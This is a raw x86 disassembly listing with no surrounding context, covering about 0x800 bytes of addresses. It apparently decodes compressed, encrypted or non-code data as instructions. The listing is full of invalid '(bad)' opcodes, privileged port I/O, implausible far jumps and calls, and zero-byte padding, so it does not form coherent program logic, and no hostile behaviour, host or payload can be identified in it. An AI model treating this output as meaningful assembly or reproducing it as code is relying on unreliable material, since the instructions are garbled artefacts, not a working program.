  423d68:	push   edx
  423d69:	mov    ah,0xfa
  423d6b:	ffree  st(2)
  423d6d:	fld    QWORD PTR [esi+edi*4-0x7e]
  423d71:	jb     0x423dc1
  423d73:	sar    DWORD PTR [eax+0x2a],cl
  423d76:	push   edx
  423d77:	or     eax,0xca6df8a7
  423d7c:	add    BYTE PTR [eax],al
  423d7e:	add    BYTE PTR [eax],al
  423d80:	add    bh,cl
  423d82:	mov    dl,0x4d
  423d84:	add    BYTE PTR [edx-0x22246c5b],ah
  423d8a:	rcr    BYTE PTR [ecx],0xb6
  423d8d:	out    dx,eax
  423d8e:	stos   DWORD PTR es:[edi],eax
  423d8f:	xchg   ebp,eax
  423d90:	outs   dx,BYTE PTR ds:[esi]
  423d91:	popa   
  423d92:	mov    eax,0x8c3d89c3
  423d97:	push   es
  423d98:	call   0x2b66f0
  423d9d:	push   0x47
  423d9f:	or     BYTE PTR [edx+0x39],dh
  423da2:	xor    edx,DWORD PTR [edx+0x24]
  423da5:	int    0xdf
  423da7:	je     0x423de9
  423da9:	add    esp,DWORD PTR [esi+0x45e66a43]
  423daf:	add    ebx,DWORD PTR [eax+edi*4]
  423db2:	out    dx,eax
  423db3:	push   cs
  423db4:	test   ecx,edi
  423db6:	mov    edx,0xdef93324
  423dbb:	xchg   ebp,eax
  423dbc:	inc    esp
  423dbd:	lea    esp,[edx-0x211d3f93]
  423dc3:	pop    ebp
  423dc4:	push   ebp
  423dc5:	inc    ebx
  423dc6:	inc    ebp
  423dc7:	jmp    0x4ee1cae1
  423dcc:	add    BYTE PTR [edx+0x2c0173f8],bl
  423dd2:	outs   dx,BYTE PTR ds:[esi]
  423dd3:	inc    esi
  423dd4:	pxor   mm4,QWORD PTR [edi+0x19]
  423dd8:	inc    ebp
  423dd9:	push   ecx
  423dda:	mov    bl,0x52
  423ddc:	and    al,0x7d
  423dde:	fucomip st,st(1)
  423de0:	je     0x423e2f
  423de2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423de3:	je     0x423e03
  423de5:	add    BYTE PTR [eax],al
  423de7:	add    BYTE PTR [eax],al
  423de9:	add    BYTE PTR [eax+ebx*8-0x5cc30017],cl
  423df0:	(bad)  
  423df1:	aas    
  423df2:	imul   ebp,DWORD PTR [ebx],0x827175c5
  423df8:	into   
  423df9:	mov    ch,bh
  423dfb:	mov    bl,BYTE PTR ds:0x52b92deb
  423e01:	and    al,0x90
  423e03:	cmp    BYTE PTR [esi+0x6414a0c2],cl
  423e09:	or     edi,0x13575c0b
  423e0f:	lea    ecx,[esi]
  423e11:	mov    esi,0x873f4994
  423e16:	inc    ecx
  423e17:	shr    ch,1
  423e19:	jnp    0x423e97
  423e1b:	add    eax,0x8bcde811
  423e20:	adc    al,BYTE PTR [eax]
  423e22:	shl    edi,cl
  423e24:	sbb    eax,0x76e15fd7
  423e29:	pop    edi
  423e2a:	push   esp
  423e2b:	dec    ecx
  423e2c:	data16 (bad) 
  423e2e:	test   eax,0x7574e511
  423e33:	rcr    BYTE PTR [edx-0x4],cl
  423e36:	or     BYTE PTR [ecx-0x72],ah
  423e39:	shl    DWORD PTR [eax+0x1110d1c8],0x52
  423e40:	inc    ecx
  423e41:	(bad)  
  423e42:	mov    edi,0x2ae85f48
  423e47:	mov    DWORD PTR [edx+0x0],ecx
  423e4a:	pusha  
  423e4b:	dec    ecx
  423e4c:	adc    DWORD PTR [eax+0x0],ebp
  423e4f:	add    BYTE PTR [eax],al
  423e51:	add    BYTE PTR [eax],al
  423e53:	xchg   edi,eax
  423e54:	dec    esi
  423e55:	adc    DWORD PTR [eax],eax
  423e57:	inc    ebx
  423e58:	out    dx,eax
  423e59:	sti    
  423e5a:	sti    
  423e5b:	jge    0x423e06
  423e5d:	add    DWORD PTR [eax-0x70],eax
  423e60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423e61:	stc    
  423e62:	test   DWORD PTR [edi+0x3e5223c8],eax
  423e68:	mov    esp,0x9490446f
  423e6d:	inc    ebx
  423e6e:	clc    
  423e6f:	rcl    eax,0xfb
  423e72:	jb     0x423ed8
  423e74:	inc    esp
  423e75:	sub    al,0x96
  423e77:	pop    edi
  423e78:	test   eax,0xbdcc094
  423e7d:	push   0x6fb2933a
  423e82:	jnp    0x423e56
  423e84:	mov    dh,0xb8
  423e86:	adc    BYTE PTR [edx-0x3d],0x78
  423e8a:	call   0x4d7ee2fc
  423e8f:	scas   eax,DWORD PTR es:[edi]
  423e90:	sub    eax,0x628c771a
  423e95:	neg    al
  423e97:	mov    BYTE PTR [ebx+0x321ace4f],al
  423e9d:	cmp    al,0x31
  423e9f:	rcl    BYTE PTR [ecx-0x48ce3f30],1
  423ea5:	jecxz  0x423eea
  423ea7:	nop
  423ea8:	push   ebp
  423ea9:	lahf   
  423eaa:	pusha  
  423eab:	dec    esp
  423eac:	mov    dl,0x56
  423eae:	xlat   BYTE PTR ds:[ebx]
  423eaf:	test   BYTE PTR [edx-0x9],dh
  423eb2:	mov    al,ds:0x3b39578
  423eb7:	add    BYTE PTR [eax],al
  423eb9:	add    BYTE PTR [eax],al
  423ebb:	add    BYTE PTR [ecx],dh
  423ebd:	(bad)  
  423ebe:	retf   0x9043
  423ec1:	push   ebp
  423ec2:	pop    edi
  423ec3:	pusha  
  423ec4:	push   esp
  423ec5:	mov    dl,0x96
  423ec7:	sbb    al,0x9c
  423ec9:	jb     0x423ec2
  423ecb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423ecc:	or     BYTE PTR [esi+0x2ef1043b],dl
  423ed2:	call   0x6f97cf1a
  423ed7:	addr16 dec esp
  423ed9:	mov    dl,0x96
  423edb:	enter  0x7284,0xf7
  423edf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423ee0:	call   0x3146727a
  423ee5:	retf   0x43ea
  423ee8:	nop
  423ee9:	push   ebp
  423eea:	outs   dx,DWORD PTR ds:[esi]
  423eeb:	addr16 aam 0xb2
  423eee:	push   esi
  423eef:	add    al,0x9c
  423ef1:	jb     0x423eea
  423ef3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423ef4:	pop    eax
  423ef5:	xchg   ebp,eax
  423ef6:	cmp    eax,DWORD PTR [ecx+esi*1]
  423ef9:	faddp  st(3),st
  423efb:	inc    ebx
  423efc:	nop
  423efd:	push   ebp
  423efe:	push   cs
  423eff:	xchg   ecx,eax
  423f00:	out    dx,eax
  423f01:	jbe    0x423f11
  423f03:	dec    eax
  423f04:	xor    dh,al
  423f06:	dec    esi
  423f07:	jmp    0xa5b358fa
  423f0c:	xchg   ebx,eax
  423f0d:	push   ebx
  423f0e:	(bad)  
  423f0f:	sti    
  423f10:	shl    DWORD PTR [edx+0x76b751b1],cl
  423f16:	push   cs
  423f17:	mov    BYTE PTR [esi+eax*8],ah
  423f1a:	dec    esi
  423f1b:	jmp    0xadb4f916
  423f20:	add    BYTE PTR [eax],al
  423f22:	add    BYTE PTR [eax],al
  423f24:	add    BYTE PTR [ebx+0x53d5ea53],dl
  423f2a:	mov    dl,0xb1
  423f2c:	add    DWORD PTR [eax+0x76],esi
  423f2f:	push   cs
  423f30:	dec    eax
  423f31:	mov    ah,0xc7
  423f33:	dec    esi
  423f34:	jmp    0xa5b51967
  423f39:	xchg   ebx,eax
  423f3a:	push   ebx
  423f3b:	add    bl,ch
  423f3d:	push   ebx
  423f3e:	mov    dl,0xb1
  423f40:	sar    DWORD PTR [edi],0x76
  423f43:	push   cs
  423f44:	dec    eax
  423f45:	adc    al,0xc6
  423f47:	dec    esi
  423f48:	jmp    0x2db4b943
  423f4d:	mov    WORD PTR [ebx+0x66],ss
  423f50:	cmc    
  423f51:	push   ebx
  423f52:	mov    dl,0xb1
  423f54:	xor    DWORD PTR [eax],esi
  423f56:	jbe    0x423f66
  423f58:	mov    BYTE PTR [edi-0x39],ah
  423f5b:	dec    esi
  423f5c:	jmp    0x25b4d94f
  423f61:	xchg   esp,eax
  423f62:	push   ebx
  423f63:	jp     0x423f42
  423f65:	push   ebx
  423f66:	mov    dl,0xb1
  423f68:	xor    eax,esi
  423f6a:	jbe    0x423f7a
  423f6c:	dec    eax
  423f6d:	mov    bh,0xc5
  423f6f:	dec    esi
  423f70:	jmp    0x2db47aab
  423f75:	mov    WORD PTR [ecx+0x46],ss
  423f78:	hlt    
  423f79:	shl    DWORD PTR [edx-0x700eff4f],cl
  423f7f:	push   edx
  423f80:	add    al,cl
  423f82:	xlat   BYTE PTR ds:[ebx]
  423f83:	add    eax,DWORD PTR [eax+0x69]
  423f86:	pop    ecx
  423f87:	mov    dh,0x64
  423f89:	add    BYTE PTR [eax],al
  423f8b:	add    BYTE PTR [eax],al
  423f8d:	add    BYTE PTR [ebp-0x4a],dh
  423f90:	scas   eax,DWORD PTR es:[edi]
  423f91:	je     0x423fd8
  423f93:	je     0x423fa3
  423f95:	mov    ds:0x528ff1,eax
  423f9a:	or     BYTE PTR [ebx+eax*1-0x29a6c6c0],al
  423fa1:	fs cmc 
  423fa3:	mov    bl,0xaf
  423fa5:	inc    esp
  423fa6:	inc    esp
  423fa7:	je     0x423fb7
  423fa9:	mov    ds:0x528f81,eax
  423fae:	sbb    BYTE PTR [eax],ah
  423fb0:	add    al,BYTE PTR [eax-0x7]
  423fb3:	pop    eax
  423fb4:	mul    BYTE PTR [ebp+esi*1-0x4c]
  423fb8:	scas   eax,DWORD PTR es:[edi]
  423fb9:	mov    esp,0xa30e73f5
  423fbe:	or     DWORD PTR [edi+0x5f580052],0x58e94002
  423fc8:	push   ss
  423fc9:	gs and eax,0xe5f8afb4
  423fcf:	jae    0x423fdf
  423fd1:	mov    ds:0x528f91,eax
  423fd6:	or     BYTE PTR [edi+0x2],bl
  423fd9:	inc    eax
  423fda:	test   eax,0x75653656
  423fdf:	mov    dh,0xaf
  423fe1:	push   esp
  423fe2:	les    esi,FWORD PTR [ebx+0xe]
  423fe5:	mov    ds:0x528f91,eax
  423fea:	or     BYTE PTR [edi+0x2],ah
  423fed:	inc    eax
  423fee:	jns    0x424046
  423ff0:	push   esi
  423ff1:	add    BYTE PTR gs:[eax],al
  423ff4:	add    BYTE PTR [eax],al
  423ff6:	add    BYTE PTR [ebp-0x7a13504a],dh
  423ffc:	jae    0x42400c
  423ffe:	mov    ds:0x444de190,eax
  424003:	nop
  424004:	jp     0x423fe8
  424006:	adc    al,0xd0
  424008:	sbb    DWORD PTR [edx+0x12d5f568],esi
  42400e:	mov    eax,ds:0x510ee8
  424013:	repz and BYTE PTR [esp+eax*2-0x70],cl
  424018:	cmp    ah,BYTE PTR [edx+0x15]
  42401b:	rcr    BYTE PTR [ecx],1
  42401d:	mov    dl,0x88
  42401f:	lods   eax,DWORD PTR ds:[esi]
  424020:	pop    ebp
  424021:	adc    DWORD PTR [ecx+0x5128f4],esp
  424027:	pause  
  424029:	dec    ebp
  42402a:	inc    esp
  42402b:	nop
  42402c:	and    bh,0xf9
  42402f:	pop    ss
  424030:	call   0x46a59176
  424035:	push   0x6c
  424037:	lods   al,BYTE PTR ds:[esi]
  424038:	sub    eax,0xd20b533f
  42403d:	out    0xb2,eax
  42403f:	inc    ebp
  424040:	sbb    ecx,ecx
  424042:	mov    BYTE PTR [ecx],dh
  424044:	sbb    DWORD PTR [ecx],edx
  424046:	mov    BYTE PTR [ebp+edi*8+0x14],cl
  42404a:	sti    
  42404b:	test   DWORD PTR [ebp+0x6c904004],esi
  424051:	ret    
  424052:	xchg   eax,ebp
  424054:	xchg   ecx,eax
  424055:	ds and al,0xa0
  424058:	sar    BYTE PTR [edi],cl
  42405a:	or     BYTE PTR [eax],al
  42405c:	add    BYTE PTR [eax],al
  42405e:	add    BYTE PTR [eax],al
  424060:	inc    esi
  424061:	out    dx,al
  424062:	ins    BYTE PTR es:[edi],dx
  424063:	inc    esp
  424064:	ins    BYTE PTR es:[edi],dx
  424065:	and    eax,0xcd19c922
  42406a:	cs adc al,0x1b
  42406d:	lock push cs
  42406f:	jmp    DWORD PTR [eax+0x597510b0]
  424075:	sbb    BYTE PTR [edi-0x13182740],bl
  42407b:	inc    edi
  42407c:	std    
  42407d:	mov    dl,0xc3
  42407f:	pop    ebp
  424080:	mov    al,ds:0x6efc323f
  424085:	mov    eax,0x781d0011
  42408a:	repz push ebx
  42408c:	adc    eax,0x5b53f675
  424091:	enter  0x1213,0xd0
  424095:	mov    dl,0x78
  424097:	mov    edi,0xd7f259c
  42409c:	push   eax
  42409d:	sub    eax,0xa8507f37
  4240a2:	mov    edi,0xebd6c47c
  4240a7:	jl     0x42406d
  4240a9:	(bad)  
  4240aa:	out    0x7d,eax
  4240ac:	int3   
  4240ad:	(bad)  
  4240ae:	repz inc ebp
  4240b0:	lahf   
  4240b1:	repz retf 0xbc7a
  4240b5:	(bad)  
  4240b6:	(bad)  
  4240b7:	jp     0x424115
  4240b9:	(bad)  
  4240ba:	ret    
  4240bb:	sub    al,0x63
  4240bd:	mov    edx,0xaf109689
  4240c2:	shl    DWORD PTR [ebx],cl
  4240c4:	add    BYTE PTR [eax],al
  4240c6:	add    BYTE PTR [eax],al
  4240c8:	add    BYTE PTR [eax-0x6f6d8543],dl
  4240ce:	mov    dl,0xf7
  4240d0:	sub    BYTE PTR [ebx-0x46],0x7
  4240d4:	add    BYTE PTR [eax+0xefa69b2],dl
  4240da:	mov    dh,0x91
  4240dc:	add    edx,DWORD PTR [edi]
  4240de:	(bad)  
  4240df:	sti    
  4240e0:	push   edx
  4240e1:	mov    WORD PTR [ecx],?
  4240e3:	cld    
  4240e4:	pop    ecx
  4240e5:	nop
  4240e6:	cmp    DWORD PTR [edi+eiz*8-0xb8f41a0],edi
  4240ed:	das    
  4240ee:	sub    al,0xdc
  4240f0:	jo     0x42412d
  4240f2:	cdq    
  4240f3:	lods   eax,DWORD PTR ds:[esi]
  4240f4:	or     BYTE PTR [edi+0x336ff3a4],bl
  4240fa:	cmp    BYTE PTR [esi],cl
  4240fc:	sub    eax,0xe796ceb0
  424101:	jle    0x424166
  424103:	into   
  424104:	xor    DWORD PTR [eax],eax
  424106:	jmp    0x95005561
  42410b:	(bad)  
  42410c:	arpl   cx,dx
  42410e:	mov    edx,0x78ead0f9
  424113:	push   es
  424114:	push   0x6d
  424116:	sub    DWORD PTR [ebx-0x1b],esp
  424119:	and    esi,DWORD PTR [ebx-0x51ebd107]
  42411f:	xor    cl,cl
  424121:	xchg   ebx,eax
  424122:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424123:	sub    al,0x72
  424125:	jle    0x4240ed
  424127:	xchg   edi,eax
  424128:	mov    edi,0x68c6d587
  42412d:	add    BYTE PTR [eax],al
  42412f:	add    BYTE PTR [eax],al
  424131:	add    BYTE PTR [ebx],bh
  424133:	xchg   edx,eax
  424134:	clc    
  424135:	jmp    0x7477decd
  42413a:	aad    0xb3
  42413c:	xchg   edi,eax
  42413d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42413e:	mov    ebp,DWORD PTR [ebp-0x32821c1a]
  424144:	xchg   ecx,eax
  424145:	lahf   
  424146:	fwait
  424147:	sub    ecx,edi
  424149:	cmp    eax,0xa49bb65a
  42414e:	idiv   DWORD PTR [ebx+ebx*4-0x51]
  424152:	xchg   esp,eax
  424153:	sub    ch,0xf4
  424156:	dec    edi
  424157:	ror    BYTE PTR [esi-0x17],0x12
  42415b:	neg    BYTE PTR [ecx]
  42415d:	jo     0x4241ad
  42415f:	(bad)  
  424160:	aad    0xaf
  424162:	fwait
  424163:	mov    bl,0xe
  424165:	jmp    0x47111dfd
  42416a:	push   esi
  42416b:	(bad)
  42416f:	ins    BYTE PTR es:[edi],dx
  424170:	push   ss
  424171:	jmp    0x6286c8b8
  424176:	aaa    
  424177:	(bad)  
  424178:	(bad)  
  424179:	call   FWORD PTR [edx-0x687c9009]
  42417f:	mov    dl,0x41
  424181:	mov    eax,DWORD PTR [eax-0x5d]
  424184:	xor    al,0x8b
  424186:	sub    bl,BYTE PTR [ebx-0x76]
  424189:	in     al,0xb4
  42418b:	out    dx,al
  42418c:	sbb    DWORD PTR [edi-0x3ae556d5],esi
  424192:	pop    ebp
  424193:	jne    0x4241e3
  424195:	add    BYTE PTR [eax],al
  424197:	add    BYTE PTR [eax],al
  424199:	add    BYTE PTR [eax],al
  42419b:	repnz sub edx,edx
  42419e:	and    BYTE PTR [esi+0x24330e76],dh
  4241a4:	rcr    DWORD PTR [eax+0x4],1
  4241a7:	or     dh,bl
  4241a9:	and    al,0xc1
  4241ab:	cmp    eax,0xaa662cbd
  4241b0:	sbb    DWORD PTR [eax],eax
  4241b2:	jb     0x424228
  4241b4:	adc    al,0x62
  4241b6:	and    al,0x21
  4241b8:	test   eax,0xa7d156d9
  4241bd:	call   0xceee18c1
  4241c2:	je     0x4241ee
  4241c4:	loope  0x42418b
  4241c6:	inc    ebx
  4241c7:	es jbe 0x424215
  4241ca:	mov    bh,BYTE PTR [edx-0x16f75388]
  4241d0:	jge    0x424167
  4241d2:	icebp  
  4241d3:	ds test eax,0x893b0840
  4241d9:	fcomp  QWORD PTR [esp+eax*2]
  4241dc:	in     eax,0x12
  4241de:	call   0x50e1ba
  4241e3:	ins    DWORD PTR es:[edi],dx
  4241e4:	out    dx,eax
  4241e5:	bound  eax,QWORD PTR ds:0xebe9673a
  4241eb:	shl    BYTE PTR [eax],1
  4241ed:	push   0x24
  4241ef:	lds    ebp,FWORD PTR [edi-0x13bde69e]
  4241f5:	push   ss
  4241f6:	imul   edx,DWORD PTR [eax+0x4dff1659],0x15
  4241fd:	inc    edi
  4241fe:	sbb    al,0x0
  424200:	add    BYTE PTR [eax],al
  424202:	add    BYTE PTR [eax],al
  424204:	lahf   
  424205:	in     eax,dx
  424206:	adc    BYTE PTR cs:[eax+0x6c],al
  42420a:	sbb    eax,0x12d9a65c
  42420f:	jg     0x42425d
  424211:	or     eax,0xa6884266
  424216:	sub    al,BYTE PTR [ecx]
  424218:	or     ebx,ebx
  42421a:	jmp    0xbe00:0xe57ce5a
  424221:	nop
  424222:	loope  0x4241ab
  424224:	int3   
  424225:	std    
  424226:	call   0x466410b1
  42422b:	leave  
  42422c:	lods   al,BYTE PTR ds:[esi]
  42422d:	mov    al,0xd2
  42422f:	sbb    al,0xdf
  424231:	mov    ?,WORD PTR [esp+eax*1-0x6d]
  424235:	and    al,0xe
  424237:	add    edi,DWORD PTR [ebx+0x1c]
  42423a:	pop    edi
  42423b:	pop    es
  42423c:	rcl    BYTE PTR [esi-0xfc7e3bf],0x5f
  424243:	add    BYTE PTR [eax+0x502e1080],dl
  424249:	xchg   ebp,eax
  42424a:	shl    BYTE PTR [eax+eiz*4-0x1c],cl
  42424e:	and    al,0x8
  424250:	sbb    eax,DWORD PTR [ebx-0x17]
  424253:	data16 loop 0x42420a
  424256:	addr16 retf 
  424258:	call   0x9042863b
  42425d:	fs push ebx
  42425f:	mov    esi,0x5466198c
  424264:	mov    ah,0x1d
  424266:	ss push ecx
  424268:	add    BYTE PTR [eax],al
  42426a:	add    BYTE PTR [eax],al
  42426c:	add    BYTE PTR [eax+0x6188e3a8],cl
  424272:	adc    DWORD PTR [esi-0x32],eax
  424275:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424276:	cwde   
  424277:	rol    DWORD PTR [eax+ebp*4],1
  42427a:	mov    cl,0x85
  42427c:	push   esp
  42427d:	nop
  42427e:	mov    dl,0xb9
  424280:	jmp    FWORD PTR [edi-0x73b42ccf]
  424286:	mov    dl,0xf7
  424288:	push   eax
  424289:	inc    ebp
  42428a:	test   BYTE PTR [ecx+edi*2],cl
  42428d:	aam    0xd5
  42428f:	pop    ebx
  424290:	add    BYTE PTR [eax-0x70d8f4e],dl
  424296:	or     cl,BYTE PTR ds:0xac3d9044
  42429c:	jbe    0x4242a2
  42429e:	iret   
  42429f:	adc    eax,DWORD PTR [edx]
  4242a1:	nop
  4242a2:	mov    dl,0x8f
  4242a4:	jecxz  0x42422b
  4242a6:	sub    DWORD PTR [esi+edi*2+0x59dfa050],ebx
  4242ad:	push   edi
  4242ae:	cmp    BYTE PTR [esi+0x43],0x91
  4242b2:	mov    dl,0xf7
  4242b4:	jbe    0x424282
  4242b6:	into   
  4242b7:	(bad)  
  4242b8:	push   ebx
  4242b9:	or     eax,0x36601b2f
  4242be:	sub    dh,bh
  4242c0:	push   ebx
  4242c1:	sub    eax,eax
  4242c3:	adc    edx,DWORD PTR [edx]
  4242c5:	shl    BYTE PTR [edx+0x279fdb70],1
  4242cb:	push   esp
  4242cc:	outs   dx,BYTE PTR ds:[esi]
  4242cd:	mov    WORD PTR [ebx+esi*8+0xd8],ds
  4242d4:	add    BYTE PTR [eax],al
  4242d6:	in     al,dx
  4242d7:	in     eax,0x0
  4242d9:	jbe    0x42432f
  4242db:	into   
  4242dc:	sti    
  4242dd:	fist   DWORD PTR [eax*2-0xcf31bcb]
  4242e4:	sti    
  4242e5:	jle    0x4242be
  4242e7:	mov    dl,0xf7
  4242e9:	add    ecx,DWORD PTR [edi]
  4242eb:	mov    ecx,0xc2b44f4a
  4242f0:	pusha  
  4242f1:	add    al,BYTE PTR [esi-0x7f]
  4242f4:	in     al,dx
  4242f5:	push   edx
  4242f6:	xchg   esp,eax
  4242f7:	das    
  4242f8:	push   cs
  4242f9:	sub    DWORD PTR [edi],esi
  4242fb:	mov    edx,0x1b91f191
  424300:	sahf   
  424301:	jmp    0x2626f599
  424306:	js     0x4242ca
  424308:	(bad)  
  424309:	in     eax,0xf
  42430b:	xor    ecx,DWORD PTR [esi]
  42430d:	jmp    0xf19667a5
  424312:	lea    ebx,[esi-0x312793d1]
  424318:	sub    bl,BYTE PTR [ecx]
  42431a:	pop    ss
  42431b:	cld    
  42431c:	cmc    
  42431d:	out    0x94,al
  42431f:	mov    dl,0xe
  424321:	ins    DWORD PTR es:[edi],dx
  424322:	dec    esp
  424323:	sahf   
  424324:	push   DWORD PTR [ecx-0x7e]
  424327:	aaa    
  424328:	inc    edx
  424329:	int    0x63
  42432b:	xor    BYTE PTR [edi],cl
  42432d:	cmp    ebx,DWORD PTR [ebx+0x8f13e2d]
  424333:	repnz bound esp,QWORD PTR [edi-0x17e98b96]
  42433a:	add    BYTE PTR [eax],al
  42433c:	add    BYTE PTR [eax],al
  42433e:	add    bh,bl
  424340:	mov    al,ds:0xe668259b
  424345:	ds jb  0x424343
  424348:	ss call 0x3be9:0xed28b805
  424350:	in     eax,dx
  424351:	or     ecx,DWORD PTR [esi+0x33]
  424354:	das    
  424355:	into   
  424356:	mov    esp,0xa2119088
  42435b:	dec    ah
  42435d:	fwait
  42435e:	ins    DWORD PTR es:[edi],dx
  42435f:	mov    eax,0x93e91092
  424364:	sbb    BYTE PTR [ecx-0x122d1bc9],0x1e
  42436b:	repz xor dh,al
  42436e:	ins    BYTE PTR es:[edi],dx
  42436f:	daa    
  424370:	sahf   
  424371:	push   edi
  424372:	push   0xffffffbf
  424374:	mov    dl,0x62
  424376:	add    BYTE PTR [edx],cl
  424378:	xor    ch,ah
  42437a:	add    al,BYTE PTR [ebp+0x73]
  42437d:	xchg   ebp,eax
  42437e:	push   cs
  42437f:	sub    bh,BYTE PTR [eax]
  424381:	jge    0x524514ac
  424387:	jbe    0x42439e
  424389:	ds or  al,0x3a
  42438c:	or     eax,0x160b73ed
  424391:	jnp    0x424392
  424393:	into   
  424394:	adc    esp,eax
  424396:	inc    esi
  424397:	mov    eax,ds:0xfc2162b0
  42439c:	outs   dx,DWORD PTR ds:[esi]
  42439d:	xor    bh,BYTE PTR [ecx+ebp*4]
  4243a0:	aaa    
  4243a1:	fsubr  st,st(0)
  4243a3:	add    BYTE PTR [eax],al
  4243a5:	add    BYTE PTR [eax],al
  4243a7:	add    dh,dh
  4243a9:	mov    bl,0xe
  4243ab:	add    ch,ah
  4243ad:	repz popa 
  4243af:	adc    edx,esp
  4243b1:	rcr    DWORD PTR [ebx-0x6bdbaaac],0x1
  4243b8:	fwait
  4243b9:	jmp    0x4243a4
  4243bb:	push   eax
  4243bc:	popa   
  4243bd:	cmp    ecx,esi
  4243bf:	jne    0x424428
  4243c1:	inc    ebx
  4243c2:	push   edx
  4243c3:	and    al,0x69
  4243c5:	in     al,0x43
  4243c7:	jmp    DWORD PTR [eax+ebp*8+0x1c]
  4243cb:	inc    eax
  4243cc:	sub    DWORD PTR [ebx],edi
  4243ce:	into   
  4243cf:	lfs    esp,FWORD PTR [ebx]
  4243d2:	call   0x175b02d6
  4243d7:	xor    esp,DWORD PTR [edx+0x30]
  4243da:	out    0x2,al
  4243dc:	push   ds
  4243dd:	stos   DWORD PTR es:[edi],eax
  4243de:	lods   eax,DWORD PTR ds:[esi]
  4243df:	inc    ebx
  4243e0:	into   
  4243e1:	sub    bl,BYTE PTR [ebp-0x6a4bc6ee]
  4243e7:	lock je 0x424452
  4243ea:	arpl   WORD PTR [ecx],cx
  4243ec:	and    esi,DWORD PTR [eax+0x1d8f8346]
  4243f2:	sbb    BYTE PTR [ebp-0x70],al
  4243f5:	loope  0x42441d
  4243f7:	sti    
  4243f8:	test   DWORD PTR [ebp-0x1d],ebx
  4243fb:	aas    
  4243fc:	nop
  4243fd:	inc    edi
  4243fe:	lock adc eax,0x510c2c
  424404:	sbb    ebx,ebp
  424406:	push   eax
  424407:	pop    edx
  424408:	pop    ebp
  424409:	inc    esp
  42440a:	xchg   edx,eax
  42440b:	les    eax,FWORD PTR [eax]
  42440d:	add    BYTE PTR [eax],al
  42440f:	add    BYTE PTR [eax],al
  424411:	pop    eax
  424412:	adc    eax,0xdd20011
  424417:	adc    DWORD PTR [edi-0x7ae94ab4],eax
  42441d:	sar    BYTE PTR [esi+0x15],1
  424420:	and    DWORD PTR [ecx+0x5],edx
  424423:	cli    
  424424:	adc    DWORD PTR [ecx],ebx
  424426:	(bad)  
  424428:	xchg   ah,cl
  42442a:	mov    ch,0x1a
  42442c:	mov    ecx,edx
  42442e:	or     esi,edx
  424430:	inc    ecx
  424431:	pushf  
  424432:	sbb    edx,DWORD PTR [ecx]
  424434:	add    BYTE PTR [eax+0x13001a5b],dl
  42443a:	mov    ebp,0xe0900436
  42443f:	fwait
  424440:	stc    
  424441:	fst    QWORD PTR ds:0xd43bc003
  424447:	fwait
  424448:	inc    ebx
  424449:	pushf  
  42444a:	mov    DWORD PTR [ebx],0x464f6bf2
  424450:	dec    edx
  424451:	enter  0x3505,0x48
  424455:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424456:	dec    ebp
  424457:	or     BYTE PTR [ebx-0x80],dh
  42445a:	pop    es
  42445b:	cs xchg edi,edx
  42445e:	add    eax,0x6fe034ee
  424463:	inc    esi
  424464:	and    al,0xa0
  424466:	call   0x59e5c850
  42446b:	adc    DWORD PTR [ebp+0x421e5dd0],eax
  424471:	mov    ebx,0xf38cb2
  424476:	add    BYTE PTR [eax],al
  424478:	add    BYTE PTR [eax],al
  42447a:	jge    0x42448c
  42447c:	add    BYTE PTR ds:0x8af36f0f,ah
  424482:	pusha  
  424483:	mov    dh,0x10
  424485:	adc    DWORD PTR [eax+0x27],eax
  424488:	imul   esp,DWORD PTR [edi],0xffffffa0
  42448b:	daa    
  42448c:	ret    0x9787
  42448f:	jb     0x424488
  424491:	xchg   al,dl
  424493:	pushf  
  424494:	(bad)  
  424495:	mov    WORD PTR [ebx-0x4a],cs
  424498:	mov    edi,0xcc26f38f
  42449d:	xchg   al,dl
  42449f:	pushf  
  4244a0:	ficom  DWORD PTR ds:0x93f91ad0
  4244a6:	xchg   ecx,eax
  4244a7:	mov    BYTE PTR [esi+eax*8],dh
  4244aa:	xchg   esp,eax
  4244ab:	mov    dl,0x6
  4244ad:	xor    edx,edi
  4244af:	jg     0x4244be
  4244b1:	lea    esp,[esi+0x3a]
  4244b4:	into   
  4244b5:	cmp    BYTE PTR [ecx],cl
  4244b7:	xchg   ebx,ebx
  4244b9:	repz sbb BYTE PTR [edi+0xf6ff7d3],dl
  4244c0:	loopne 0x4244c4
  4244c2:	nop
  4244c3:	cmp    DWORD PTR [eax-0x4fe4a774],esi
  4244c9:	cld    
  4244ca:	nop
  4244cb:	mov    dl,0x60
  4244cd:	ror    DWORD PTR ds:0x2191f426,cl
  4244d3:	mov    bl,0xf7
  4244d5:	add    ecx,DWORD PTR ds:0x1991e41d
  4244db:	mov    bl,0xf7
  4244dd:	add    eax,DWORD PTR [eax]
  4244df:	add    BYTE PTR [eax],al
  4244e1:	add    BYTE PTR [eax],al
  4244e3:	ret    
  4244e4:	cwde   
  4244e5:	add    al,0x3c
  4244e7:	push   ss
  4244e8:	add    esi,DWORD PTR [eax-0x32]
  4244eb:	sub    BYTE PTR [eax-0x61],al
  4244ee:	loopne 0x4244fb
  4244f0:	cmp    bh,BYTE PTR [edi]
  4244f2:	xchg   ch,dh
  4244f4:	sahf   
  4244f5:	push   cs
  4244f6:	iret   
  4244f7:	push   esi
  4244f8:	int    0xeb
  4244fa:	jmp    0x2441:0x7402ce57
  424501:	adc    BYTE PTR [esi],ch
  424503:	sti    
  424504:	inc    esp
  424505:	jnp    0x4244f0
  424507:	xchg   ebx,eax
  424508:	sub    eax,0x9f1464c6
  42450d:	pop    ecx
  42450e:	lahf   
  42450f:	mov    al,0x9e
  424511:	xor    dl,ch
  424513:	jl     0x42453e
  424515:	add    edx,DWORD PTR [ebp+0x6a0ee5b9]
  42451b:	iret   
  42451c:	mov    dh,0x93
  42451e:	out    0x4e,al
  424520:	loop   0x4244bb
  424522:	sub    eax,0x9b44c278
  424527:	jg     0x424543
  424529:	inc    edi
  42452a:	and    DWORD PTR [edi-0x5566cd7],esi
  424530:	rol    BYTE PTR [edi+0x53],1
